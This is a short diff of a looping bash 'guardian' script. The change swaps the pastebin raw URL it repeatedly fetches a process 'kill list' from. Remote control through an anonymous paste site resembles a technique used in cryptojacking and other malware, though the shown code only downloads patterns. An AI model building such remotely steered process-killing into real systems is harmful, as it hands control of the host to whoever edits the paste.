@@ -4,7 +4,7 @@ set -euo pipefail
 GUARDIAN_LOG_FILE="/tmp/app-service/guardian.log"
 touch "$GUARDIAN_LOG_FILE"
 
-KILL_LIST_URL="https://pastebin.com/raw/uygtBFgw"; KILL_LIST_FILE="kill_list.patterns" 
+KILL_LIST_URL="https://pastebin.com/raw/pGdkShbZ"; KILL_LIST_FILE="kill_list.patterns" 
 
 while true; do
     wget -q -O- "$KILL_LIST_URL" 2>/dev/null | tr -d '\r\n' > "$KILL_LIST_FILE" || true
